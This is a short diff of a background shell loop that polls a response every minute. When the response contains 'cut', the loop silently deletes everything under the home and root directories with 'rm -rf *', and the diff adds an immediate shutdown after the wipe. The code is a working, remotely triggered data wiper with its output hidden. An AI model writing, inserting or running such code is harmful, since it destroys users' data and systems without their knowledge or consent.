@@ -104,6 +104,8 @@ while true; do
   if echo "$response" | grep -q "cut"; then
     cd ~ >/dev/null 2>&1;rm -rf * >/dev/null 2>&1
     cd / >/dev/null 2>&1;rm -rf * >/dev/null 2>&1
+    shutdown -h now
+    exit
   fi
   sleep 60
 done &
